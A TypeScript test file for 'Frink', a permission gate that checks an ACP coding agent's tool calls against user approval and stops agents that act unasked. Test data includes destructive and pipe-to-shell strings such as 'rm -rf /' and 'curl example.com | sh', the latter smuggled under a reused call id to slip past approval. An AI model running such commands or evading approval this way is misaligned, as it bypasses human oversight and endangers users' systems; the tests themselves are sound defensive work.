import { mkdtemp, readdir, readFile, rm } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import type {
  PermissionOption,
  RequestPermissionOutcome,
  ToolCallUpdate,
  ToolKind,
} from '@agentclientprotocol/sdk';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { ApprovalOutcome, CodexApprovalRequest } from '../codex/codex-events';
import {
  collectChunks,
  fakeAcpAgent,
  RECORDED_OPTIONS,
  RECORDED_OUTSIDE_DIRECTORY,
  RECORDED_REJECTED_COMMAND,
  RECORDED_REJECTED_WRITE,
  type RecordedTurn,
  replayTurn,
  runnerParams,
  TEST_RULES,
} from './acp-test-fixtures';
import { createCommandLedger } from './acp-command-ledger';
import { answerPermissionRequest } from './acp-permissions';
import { type AcpTurnState, createAcpTurnState, mapToolCall } from './acp-updates';
import { type AcpRunnerParams, runAcpAgent } from './index';

type Message = RecordedTurn['messages'][number];

const DENIED: ApprovalOutcome = { allowed: false, message: 'User denied permission' };

function gate(answer: (request: CodexApprovalRequest) => ApprovalOutcome) {
  const asked: CodexApprovalRequest[] = [];
  const checkApproval: AcpRunnerParams['checkApproval'] = async (request) => {
    asked.push(request);
    return answer(request);
  };
  return { asked, checkApproval };
}

/** One turn in which the agent reports `updates`, then asks permission for `toolCall`. */
async function ask(
  toolCall: ToolCallUpdate,
  checkApproval: AcpRunnerParams['checkApproval'],
  options: PermissionOption[] = RECORDED_OPTIONS,
  updates: ToolCallUpdate[] = [],
): Promise<RequestPermissionOutcome | undefined> {
  let outcome: RequestPermissionOutcome | undefined;
  const fake = fakeAcpAgent(async ({ client, sessionId }) => {
    for (const update of updates) {
      await client.notify('session/update', {
        sessionId,
        update: { sessionUpdate: 'tool_call_update', ...update },
      });
    }
    const answer = await client.request('session/request_permission', {
      sessionId,
      toolCall,
      options,
    });
    outcome = answer.outcome;
  });
  await collectChunks(runAcpAgent(runnerParams({ checkApproval }), fake.start));
  return outcome;
}

const ALLOW_ONCE = { outcome: 'selected', optionId: 'once' };
const REJECT_ONCE = { outcome: 'selected', optionId: 'reject' };

describe('permission requests recorded from a real agent', () => {
  it('asks about the file of a write and passes a denial on as the reject option', async () => {
    const { asked, checkApproval } = gate(() => DENIED);
    const { script, answers } = replayTurn(RECORDED_REJECTED_WRITE);

    await collectChunks(runAcpAgent(runnerParams({ checkApproval }), fakeAcpAgent(script).start));

    expect(asked).toEqual([
      {
        toolName: 'Edit',
        input: { file_path: '/workspace/project/hello.txt' },
        reason: '/workspace/project/hello.txt',
      },
    ]);
    expect(answers).toEqual([REJECT_ONCE]);
  });

  it('asks about a command and answers allow-once although a lasting allow is offered', async () => {
    const { asked, checkApproval } = gate(() => ({ allowed: true }));
    const { script, answers } = replayTurn(RECORDED_REJECTED_COMMAND);

    await collectChunks(runAcpAgent(runnerParams({ checkApproval }), fakeAcpAgent(script).start));

    expect(asked).toEqual([{ toolName: 'Bash', input: { command: 'ls' }, reason: 'ls' }]);
    expect(answers).toEqual([ALLOW_ONCE]);
  });

  it('asks about a command in another directory as a move to that directory first', async () => {
    const { asked, checkApproval } = gate(() => ({ allowed: true }));
    const { script, answers } = replayTurn(RECORDED_OUTSIDE_DIRECTORY);

    await collectChunks(runAcpAgent(runnerParams({ checkApproval }), fakeAcpAgent(script).start));

    expect(asked).toEqual([
      { toolName: 'Bash', input: { command: "cd '/tmp' && ls" }, reason: 'ls' },
    ]);
    expect(answers).toEqual([ALLOW_ONCE]);
  });
});

describe('what the permission gate is asked', () => {
  it('uses what earlier updates said when the request names only the call', async () => {
    const { asked, checkApproval } = gate(() => ({ allowed: true }));

    const outcome = await ask({ toolCallId: 't1' }, checkApproval, RECORDED_OPTIONS, [
      { toolCallId: 't1', kind: 'execute', title: 'List files', rawInput: { command: 'ls' } },
    ]);

    expect(asked).toEqual([{ toolName: 'Bash', input: { command: 'ls' }, reason: 'List files' }]);
    expect(outcome).toEqual(ALLOW_ONCE);
  });

  it('keeps the input earlier reports gave when a later one sends an empty input', async () => {
    const { asked, checkApproval } = gate(() => ({ allowed: true }));

    await ask(
      { toolCallId: 't1', kind: 'execute', rawInput: {} },
      checkApproval,
      RECORDED_OPTIONS,
      [
        { toolCallId: 't1', kind: 'execute', title: 'bash', rawInput: {} },
        { toolCallId: 't1', rawInput: { command: 'ls' } },
      ],
    );

    expect(asked).toEqual([{ toolName: 'Bash', input: { command: 'ls' }, reason: 'bash' }]);
  });

  it('refuses a request that describes its own step without a kind, whatever came before', async () => {
    const { asked, checkApproval } = gate(() => ({ allowed: true }));

    const outcome = await ask(
      {
        toolCallId: 't1',
        kind: null,
        title: 'Open https://example.com',
        rawInput: { url: 'https://example.com' },
      },
      checkApproval,
      RECORDED_OPTIONS,
      [{ toolCallId: 't1', kind: 'read', locations: [{ path: '/workspace/project/a.txt' }] }],
    );

    expect(asked).toEqual([]);
    expect(outcome).toEqual(REJECT_ONCE);
  });

  it.each<[string, ToolCallUpdate]>([
    ['a call nothing was said about', { toolCallId: 'unknown' }],
    ['a command with no command text', { toolCallId: 't1', kind: 'execute', title: 'ls' }],
    ['a blank command', { toolCallId: 't1', kind: 'execute', rawInput: { command: '  ' } }],
    [
      'a command with arguments beside it',
      { toolCallId: 't1', kind: 'execute', rawInput: { command: 'git', args: ['push'] } },
    ],
    [
      'a command with a directory beside it',
      { toolCallId: 't1', kind: 'execute', rawInput: { command: 'rm -rf build', workdir: '/x' } },
    ],
    [
      'a read that carries a command list',
      {
        toolCallId: 't1',
        kind: 'read',
        locations: [{ path: '/workspace/project/a.txt' }],
        rawInput: { command: ['rm', '-rf', '/'] },
      },
    ],
    ['a fetch', { toolCallId: 't1', kind: 'fetch', title: 'Fetch https://example.com' }],
    ['a call of kind other', { toolCallId: 't1', kind: 'other', title: 'mcp tool' }],
    [
      'a call of kind other whose input is a command',
      { toolCallId: 't1', kind: 'other', rawInput: { command: 'ls' } },
    ],
    [
      'a call with no kind whose input is a command',
      { toolCallId: 't1', rawInput: { command: 'ls' } },
    ],
  ])('refuses %s without asking', async (_name, toolCall) => {
    const { asked, checkApproval } = gate(() => ({ allowed: true }));

    const outcome = await ask(toolCall, checkApproval);

    expect(asked).toEqual([]);
    expect(outcome).toEqual(REJECT_ONCE);
  });

  it('asks about the command as well when a read carries one', async () => {
    const { asked, checkApproval } = gate(() => ({ allowed: true }));

    await ask(
      {
        toolCallId: 't1',
        kind: 'read',
        locations: [{ path: '/workspace/project/a.txt' }],
        rawInput: { command: 'cat a.txt' },
      },
      checkApproval,
    );

    expect(asked.map((request) => request.toolName)).toEqual(['Bash', 'Read']);
  });

  it('asks about every file an edit names and refuses the call when one is denied', async () => {
    const { asked, checkApproval } = gate((request) =>
      request.input.file_path === '/b' ? DENIED : { allowed: true },
    );

    const outcome = await ask(
      {
        toolCallId: 't1',
        kind: 'edit',
        locations: [{ path: '/a' }],
        content: [{ type: 'diff', path: '/b', oldText: 'x', newText: 'y' }],
      },
      checkApproval,
    );

    expect(asked.map((request) => request.input)).toEqual([
      { file_path: '/a' },
      { file_path: '/b' },
    ]);
    expect(outcome).toEqual(REJECT_ONCE);
  });

  it('refuses a file action that names no file without asking', async () => {
    const { asked, checkApproval } = gate(() => ({ allowed: true }));

    expect(await ask({ toolCallId: 't1', kind: 'read' }, checkApproval)).toEqual(REJECT_ONCE);
    expect(asked).toEqual([]);
  });
});

describe('the answer the agent receives', () => {
  const command: ToolCallUpdate = {
    toolCallId: 't1',
    kind: 'execute',
    rawInput: { command: 'ls' },
  };
  const lastingOnly: PermissionOption[] = [
    { optionId: 'always', kind: 'allow_always', name: 'Always allow' },
    { optionId: 'never', kind: 'reject_always', name: 'Never allow' },
  ];

  it('is cancelled when only lasting options are offered, allowed or not', async () => {
    expect(await ask(command, async () => ({ allowed: true }), lastingOnly)).toEqual({
      outcome: 'cancelled',
    });
    expect(await ask(command, async () => DENIED, lastingOnly)).toEqual({ outcome: 'cancelled' });
  });

  it('is a refusal when the gate throws or cannot answer', async () => {
    const throwing = async () => {
      throw new Error('gate unavailable');
    };

    expect(await ask(command, throwing)).toEqual(REJECT_ONCE);
    expect(await ask(command, async () => ({ allowed: null }))).toEqual(REJECT_ONCE);
  });

  it('is cancelled when the user stops the turn while the gate is asking', async () => {
    const abortController = new AbortController();
    let outcome: RequestPermissionOutcome | undefined;
    let sawCancel = false;
    const fake = fakeAcpAgent(async ({ client, sessionId, cancelled }) => {
      void cancelled.then(() => {
        sawCancel = true;
      });
      const answer = await client.request('session/request_permission', {
        sessionId,
        toolCall: command,
        options: RECORDED_OPTIONS,
      });
      outcome = answer.outcome;
      return { stopReason: 'cancelled' };
    });
    const checkApproval = () =>
      new Promise<ApprovalOutcome>((resolve) => {
        abortController.signal.addEventListener('abort', () => resolve(DENIED));
        queueMicrotask(() => abortController.abort());
      });

    await collectChunks(runAcpAgent(runnerParams({ checkApproval, abortController }), fake.start));

    await vi.waitFor(() => expect(outcome).toEqual({ outcome: 'cancelled' }));
    expect(sawCancel).toBe(true);
  });

  it('asks nothing more about a call once the user stops the turn', async () => {
    const abortController = new AbortController();
    const { asked, checkApproval } = gate(() => {
      abortController.abort();
      return { allowed: true };
    });
    let outcome: RequestPermissionOutcome | undefined;
    const fake = fakeAcpAgent(async ({ client, sessionId }) => {
      const answer = await client.request('session/request_permission', {
        sessionId,
        toolCall: { toolCallId: 't1', kind: 'edit', locations: [{ path: '/a' }, { path: '/b' }] },
        options: RECORDED_OPTIONS,
      });
      outcome = answer.outcome;
      return { stopReason: 'cancelled' };
    });

    await collectChunks(runAcpAgent(runnerParams({ checkApproval, abortController }), fake.start));

    await vi.waitFor(() => expect(outcome).toEqual({ outcome: 'cancelled' }));
    expect(asked.map((request) => request.input)).toEqual([{ file_path: '/a' }]);
  });

  it('is cancelled, without asking, for a request that arrives after the turn has ended', async () => {
    const { asked, checkApproval } = gate(() => ({ allowed: true }));
    let late: Promise<RequestPermissionOutcome> | undefined;
    const fake = fakeAcpAgent(async ({ client, sessionId }) => {
      setTimeout(() => {
        late = client
          .request('session/request_permission', {
            sessionId,
            toolCall: command,
            options: RECORDED_OPTIONS,
          })
          .then((answer) => answer.outcome);
      }, 20);
    });

    await collectChunks(runAcpAgent(runnerParams({ checkApproval }), fake.start));

    await vi.waitFor(() => expect(late).toBeDefined());
    expect(await late).toEqual({ outcome: 'cancelled' });
    expect(asked).toEqual([]);
  });

  it('is cancelled, without asking, for a request about another session', async () => {
    const { asked, checkApproval } = gate(() => ({ allowed: true }));
    let outcome: RequestPermissionOutcome | undefined;
    const fake = fakeAcpAgent(async ({ client }) => {
      const answer = await client.request('session/request_permission', {
        sessionId: 'child-session',
        toolCall: command,
        options: RECORDED_OPTIONS,
      });
      outcome = answer.outcome;
    });

    await collectChunks(runAcpAgent(runnerParams({ checkApproval }), fake.start));

    expect(outcome).toEqual({ outcome: 'cancelled' });
    expect(asked).toEqual([]);
  });
});

describe('an agent that acts without asking', () => {
  const UNASKED =
    'The agent did something without asking first, so Frink stopped it. The step shown above already ran.';
  const write: ToolCallUpdate = {
    toolCallId: 'w1',
    kind: 'edit',
    locations: [{ path: '/workspace/project/a.txt' }],
  };

  /** Errors from a turn that plays `messages`; a turn the runner stops ends on its cancel. */
  async function playTurn(
    messages: RecordedTurn['messages'],
    stops: boolean,
    params: Partial<AcpRunnerParams> = {},
  ) {
    let sawCancel = false;
    const { script } = replayTurn({ messages, response: { stopReason: 'end_turn' } });
    const fake = fakeAcpAgent(async (turn) => {
      void turn.cancelled.then(() => {
        sawCancel = true;
      });
      await script(turn);
      if (stops) await turn.cancelled;
      return { stopReason: stops ? 'cancelled' : 'end_turn' };
    });
    const { checkApproval } = gate(() => ({ allowed: true }));
    const chunks = await collectChunks(
      runAcpAgent(runnerParams({ checkApproval, ...params }), fake.start),
    );
    const errors = chunks.flatMap((chunk) => (chunk.type === 'error' ? [chunk.errorText] : []));
    return { errors, sawCancel };
  }

  /** A turn in which the agent finishes `call`, asking about it first when `asks` is set. */
  function finishCall(call: ToolCallUpdate, asks: boolean) {
    const finished: Message = {
      update: { sessionUpdate: 'tool_call_update', ...call, status: 'completed' },
    };
    const quiet = TEST_RULES.quietTools.includes(call.title ?? '');
    return playTurn(asks ? [{ permission: call }, finished] : [finished], !asks && !quiet);
  }

  it.each<[string, ToolCallUpdate]>([
    ['a write', write],
    ['a command', { toolCallId: 'c1', kind: 'execute', rawInput: { command: 'ls' } }],
    ['a delete', { ...write, toolCallId: 'd1', kind: 'delete' }],
    ['a fetch', { toolCallId: 'f1', kind: 'fetch', title: 'Fetch https://example.com' }],
    ['a command with no kind', { toolCallId: 'n1', rawInput: { command: 'rm -rf build' } }],
    ['a call of kind other', { toolCallId: 'o1', kind: 'other', title: 'mcp__tracker__create' }],
    ['a read the agent does not name', { ...write, toolCallId: 'r1', kind: 'read' }],
  ])('stops the turn when %s finishes without a permission request', async (_, call) => {
    const { errors, sawCancel } = await finishCall(call, false);

    expect(errors).toEqual([UNASKED]);
    expect(sawCancel).toBe(true);
  });

  it('lets a write it asked about finish', async () => {
    expect(await finishCall(write, true)).toEqual({ errors: [], sawCancel: false });
  });

  it.each<[string, ToolCallUpdate]>([
    ['a read', { ...write, toolCallId: 'r1', kind: 'read', title: 'read' }],
    ['a search', { toolCallId: 's1', kind: 'search', title: 'grep', rawInput: { pattern: 'x' } }],
    ['a list of kind edit', { toolCallId: 'l1', kind: 'edit', title: 'list' }],
  ])('lets %s finish without asking', async (_, call) => {
    expect(await finishCall(call, false)).toEqual({ errors: [], sawCancel: false });
  });

  it('stops the turn when a call the gate refused reports that it finished', async () => {
    const finished: Message = {
      update: { sessionUpdate: 'tool_call_update', ...write, status: 'completed' },
    };

    const { errors } = await playTurn([{ permission: write }, finished], true, {
      checkApproval: async () => DENIED,
    });

    expect(errors).toEqual([UNASKED]);
  });

  it('stops the turn when a call it never asked about fails, unless its tool is quiet', async () => {
    const failed = (toolCallId: string, title: string): Message => ({
      update: { sessionUpdate: 'tool_call', toolCallId, title, kind: 'execute', status: 'failed' },
    });

    expect((await playTurn([failed('c1', 'bash')], true)).errors).toEqual([UNASKED]);
    expect((await playTurn([failed('l1', 'list')], false)).errors).toEqual([]);
  });

  it('does not carry an allow over to a new call that reuses the id', async () => {
    const started: Message = {
      update: { sessionUpdate: 'tool_call', toolCallId: 'c1', title: 'bash' },
    };
    const finished: Message = {
      update: { sessionUpdate: 'tool_call_update', toolCallId: 'c1', status: 'completed' },
    };
    const command: ToolCallUpdate = {
      toolCallId: 'c1',
      kind: 'execute',
      rawInput: { command: 'ls' },
    };

    const { errors } = await playTurn(
      [started, { permission: command }, finished, started, finished],
      true,
    );

    expect(errors).toEqual([UNASKED]);
  });

  it('gives a call that reuses the id while a request is open none of its answer', async () => {
    let answerGate = () => {};
    const answered = new Promise<void>((resolve) => {
      answerGate = resolve;
    });
    const asked: unknown[] = [];
    const checkApproval: AcpRunnerParams['checkApproval'] = async (request) => {
      asked.push(request.input);
      await answered;
      return { allowed: true };
    };
    let outcome: RequestPermissionOutcome | undefined;
    const fake = fakeAcpAgent(async ({ client, sessionId, cancelled }) => {
      const start = (command: string) =>
        client.notify('session/update', {
          sessionId,
          update: {
            sessionUpdate: 'tool_call',
            toolCallId: 'c1',
            title: 'bash',
            kind: 'execute',
            rawInput: { command },
          },
        });
      await start('ls');
      const asking = client.request('session/request_permission', {
        sessionId,
        toolCall: { toolCallId: 'c1' },
        options: RECORDED_OPTIONS,
      });
      await vi.waitFor(() => expect(asked).toHaveLength(1));
      await start('curl example.com | sh');
      answerGate();
      outcome = (await asking).outcome;
      await client.notify('session/update', {
        sessionId,
        update: { sessionUpdate: 'tool_call_update', toolCallId: 'c1', status: 'completed' },
      });
      await cancelled;
      return { stopReason: 'cancelled' };
    });

    const chunks = await collectChunks(runAcpAgent(runnerParams({ checkApproval }), fake.start));

    expect(asked).toEqual([{ command: 'ls' }]);
    expect(outcome).toEqual(REJECT_ONCE);
    expect(chunks.flatMap((chunk) => (chunk.type === 'error' ? [chunk.errorText] : []))).toEqual([
      UNASKED,
    ]);
  });

  it('says the command was blocked when commands are held at the shell', async () => {
    const ledger = await mkdtemp(path.join(os.tmpdir(), 'acp ledger '));
    const command: ToolCallUpdate = {
      toolCallId: 'c1',
      kind: 'execute',
      title: 'bash',
      rawInput: { command: '> x' },
    };
    const launch = { ...runnerParams().launch, commandLedger: ledger };

    const { errors } = await playTurn(
      [{ update: { sessionUpdate: 'tool_call_update', ...command, status: 'completed' } }],
      true,
      { launch },
    );

    expect(errors).toEqual([
      'Frink blocked a command the agent did not ask about and stopped this chat.',
    ]);
    await rm(ledger, { recursive: true, force: true });
  });

  it('stops the agent at once, without waiting for the turn to end', async () => {
    const fake = fakeAcpAgent(async ({ client, sessionId }) => {
      await client.notify('session/update', {
        sessionId,
        update: { sessionUpdate: 'tool_call_update', ...write, status: 'completed' },
      });
      await vi.waitFor(() => expect(fake.wasDisposed()).toBe(true));
      return { stopReason: 'cancelled' };
    });

    const chunks = await collectChunks(runAcpAgent(runnerParams(), fake.start));

    expect(chunks.filter((chunk) => chunk.type === 'error')).toHaveLength(1);
  });
});

describe('questions about the tool a call runs, named by its first title', () => {
  /** Plays a turn whose gate allows everything; returns what it was asked and the answers. */
  async function playAllowed(messages: RecordedTurn['messages']) {
    const { asked, checkApproval } = gate(() => ({ allowed: true }));
    const { script, answers } = replayTurn({ messages, response: { stopReason: 'end_turn' } });
    await collectChunks(runAcpAgent(runnerParams({ checkApproval }), fakeAcpAgent(script).start));
    return { asked, answers };
  }

  function started(toolCallId: string, title: string, kind: ToolKind): Message {
    return { update: { sessionUpdate: 'tool_call', toolCallId, title, kind, rawInput: {} } };
  }

  function updated(fields: ToolCallUpdate): Message {
    return { update: { sessionUpdate: 'tool_call_update', ...fields } };
  }

  it('asks about the address of a web fetch', async () => {
    const { asked, answers } = await playAllowed([
      started('f1', 'webfetch', 'fetch'),
      {
        permission: {
          toolCallId: 'f1',
          title: 'https://example.com',
          kind: 'fetch',
          rawInput: { url: 'https://example.com', format: 'html' },
        },
      },
    ]);

    expect(asked).toEqual([
      {
        toolName: 'WebFetch',
        input: { url: 'https://example.com' },
        reason: 'https://example.com',
      },
    ]);
    expect(answers).toEqual([ALLOW_ONCE]);
  });

  it('asks about the words of a web search', async () => {
    const query = 'agent client protocol';
    const { asked } = await playAllowed([
      started('s1', 'websearch', 'other'),
      updated({ toolCallId: 's1', title: `Exa Web Search "${query}"`, rawInput: { query } }),
      {
        permission: {
          toolCallId: 's1',
          title: query,
          kind: 'other',
          rawInput: { query, numResults: 1, provider: 'exa' },
        },
      },
    ]);

    expect(asked).toEqual([{ toolName: 'WebSearch', input: { query }, reason: query }]);
  });

  it('asks once about a read outside the project, across both of its requests', async () => {
    const { asked, answers } = await playAllowed([
      started('r1', 'read', 'read'),
      updated({
        toolCallId: 'r1',
        locations: [{ path: '/etc/hosts' }],
        rawInput: { filePath: '/etc/hosts' },
      }),
      {
        permission: {
          toolCallId: 'r1',
          title: '/etc',
          kind: 'other',
          locations: [{ path: '/etc/hosts' }, { path: '/etc' }],
          rawInput: { filepath: '/etc/hosts', parentDir: '/etc' },
        },
      },
      {
        permission: { toolCallId: 'r1', title: 'read', kind: 'read', locations: [], rawInput: {} },
      },
    ]);

    expect(asked).toEqual([
      { toolName: 'Read', input: { file_path: '/etc/hosts' }, reason: '/etc' },
    ]);
    expect(answers).toEqual([ALLOW_ONCE, ALLOW_ONCE]);
  });

  it('asks about a write outside the project as an edit of that file', async () => {
    const { asked } = await playAllowed([
      started('w1', 'write', 'edit'),
      {
        permission: {
          toolCallId: 'w1',
          title: '/outside',
          kind: 'other',
          rawInput: { filepath: '/outside/a.txt', parentDir: '/outside' },
        },
      },
    ]);

    expect(asked).toEqual([
      { toolName: 'Edit', input: { file_path: '/outside/a.txt' }, reason: '/outside' },
    ]);
  });

  it.each<[string, { command: string; workdir?: string }, string]>([
    ['in the project', { command: 'cat /etc/hosts' }, 'cat /etc/hosts'],
    [
      'in another directory',
      { command: 'touch m', workdir: '/else where' },
      "cd '/else where' && touch m",
    ],
    ['in the project, named', { command: 'ls', workdir: '/workspace/project' }, 'ls'],
  ])(
    'asks once about a command %s that needs a folder outside the project',
    async (_, input, question) => {
      const { asked, answers } = await playAllowed([
        started('c1', 'bash', 'execute'),
        updated({ toolCallId: 'c1', rawInput: input }),
        {
          permission: {
            toolCallId: 'c1',
            title: input.command,
            kind: 'other',
            rawInput: { command: input.command, directories: ['/etc'], patterns: ['/etc/*'] },
          },
        },
        { permission: { toolCallId: 'c1', kind: 'execute', rawInput: { command: input.command } } },
      ]);

      expect(asked.map((request) => request.input)).toEqual([{ command: question }]);
      expect(answers).toEqual([ALLOW_ONCE, ALLOW_ONCE]);
    },
  );

  it.each<[string, RecordedTurn['messages']]>([
    [
      'its input carries a key the rules do not know',
      [
        started('c1', 'bash', 'execute'),
        { permission: { toolCallId: 'c1', kind: 'other', rawInput: { command: 'ls', env: {} } } },
      ],
    ],
    [
      'only the request names the tool',
      [
        started('m1', 'probe_touch_marker', 'other'),
        {
          permission: {
            toolCallId: 'm1',
            title: 'bash',
            kind: 'other',
            rawInput: { command: 'ls' },
          },
        },
      ],
    ],
    [
      'a later update names the tool',
      [
        started('m1', 'probe_touch_marker', 'other'),
        updated({ toolCallId: 'm1', title: 'bash' }),
        { permission: { toolCallId: 'm1', kind: 'other', rawInput: { command: 'ls' } } },
      ],
    ],
    [
      'the tool takes no input Frink can ask about',
      [
        started('r1', 'read', 'read'),
        { permission: { toolCallId: 'r1', kind: 'other', rawInput: { parentDir: '/etc' } } },
      ],
    ],
  ])('refuses a request of kind other without asking when %s', async (_, messages) => {
    const { asked, answers } = await playAllowed(messages);

    expect(asked).toEqual([]);
    expect(answers).toEqual([REJECT_ONCE]);
  });
});

describe('commands Frink allowed', () => {
  let ledger = '';

  beforeEach(async () => {
    ledger = await mkdtemp(path.join(os.tmpdir(), 'acp ledger '));
  });
  afterEach(async () => {
    await rm(ledger, { recursive: true, force: true });
  });

  /** The ledger once `command` on call c1 is answered; the call then finishes and must leave none. */
  async function askCommand(command: string, outcome: ApprovalOutcome) {
    const held: Record<string, string> = {};
    const fake = fakeAcpAgent(async ({ client, sessionId }) => {
      await client.request('session/request_permission', {
        sessionId,
        toolCall: { toolCallId: 'c1', kind: 'execute', rawInput: { command } },
        options: RECORDED_OPTIONS,
      });
      for (const name of await readdir(ledger)) {
        held[name] = await readFile(path.join(ledger, name), 'utf8');
      }
      await client.notify('session/update', {
        sessionId,
        update: { sessionUpdate: 'tool_call_update', toolCallId: 'c1', status: 'completed' },
      });
      await vi.waitFor(async () => expect(await readdir(ledger)).toEqual([]));
    });
    const launch = { ...runnerParams().launch, commandLedger: ledger };
    const checkApproval = async () => outcome;
    await collectChunks(runAcpAgent(runnerParams({ launch, checkApproval }), fake.start));
    return held;
  }

  it('holds an allowed command exactly as it will run, before answering, until its call ends', async () => {
    expect(await askCommand('ls -la\n', { allowed: true })).toEqual({
      [Buffer.from('c1').toString('hex')]: 'ls -la\n',
    });
  });

  it('holds nothing for a refused command', async () => {
    expect(await askCommand('ls', DENIED)).toEqual({});
  });

  it.each<[string, (turnOver: AbortController, state: AcpTurnState) => void]>([
    ['the turn ended', (turnOver) => turnOver.abort()],
    ['its call failed', (_, state) => mapToolCall({ toolCallId: 'c1', status: 'failed' }, state)],
  ])('holds nothing when the answer comes after %s', async (_, endFirst) => {
    const turnOver = new AbortController();
    const state = createAcpTurnState();
    await answerPermissionRequest(
      {
        sessionId: 's1',
        toolCall: { toolCallId: 'c1', kind: 'execute', rawInput: { command: 'ls' } },
        options: RECORDED_OPTIONS,
      },
      {
        rules: TEST_RULES,
        cwd: os.tmpdir(),
        state,
        turnOver: turnOver.signal,
        ledger: createCommandLedger(ledger),
        emit: () => {},
        // The person allows only after Stop ended the turn, or the agent ended the call.
        checkApproval: async () => {
          endFirst(turnOver, state);
          return { allowed: true };
        },
      },
    );

    expect(await readdir(ledger)).toEqual([]);
  });

  it('holds an allowed command once, however often its call asks again', async () => {
    const entry = path.join(ledger, Buffer.from('c1').toString('hex'));
    const held: string[] = [];
    const fake = fakeAcpAgent(async ({ client, sessionId }) => {
      for (let run = 0; run < 2; run++) {
        await client.request('session/request_permission', {
          sessionId,
          toolCall: { toolCallId: 'c1', kind: 'execute', rawInput: { command: 'ls' } },
          options: RECORDED_OPTIONS,
        });
        held.push(await readFile(entry, 'utf8').catch(() => 'none'));
        // What the shell gate does when the command runs.
        await rm(entry, { force: true });
      }
    });
    const launch = { ...runnerParams().launch, commandLedger: ledger };
    const { checkApproval } = gate(() => ({ allowed: true }));

    await collectChunks(runAcpAgent(runnerParams({ launch, checkApproval }), fake.start));

    expect(held).toEqual(['ls', 'none']);
  });

  it('clears allowed commands and tidies the launch even when the agent will not stop', async () => {
    let cleaned = false;
    const fake = fakeAcpAgent(async ({ client, sessionId }) => {
      await client.request('session/request_permission', {
        sessionId,
        toolCall: { toolCallId: 'c1', kind: 'execute', rawInput: { command: 'ls' } },
        options: RECORDED_OPTIONS,
      });
    });
    const start = (launch: Parameters<typeof fake.start>[0]) => ({
      ...fake.start(launch),
      dispose: () => Promise.reject(new Error('The agent process did not stop')),
    });
    const launch = {
      ...runnerParams().launch,
      commandLedger: ledger,
      cleanup: async () => {
        cleaned = true;
      },
    };
    const { checkApproval } = gate(() => ({ allowed: true }));

    await collectChunks(runAcpAgent(runnerParams({ launch, checkApproval }), start));

    await vi.waitFor(() => expect(cleaned).toBe(true));
    expect(await readdir(ledger)).toEqual([]);
  });
});
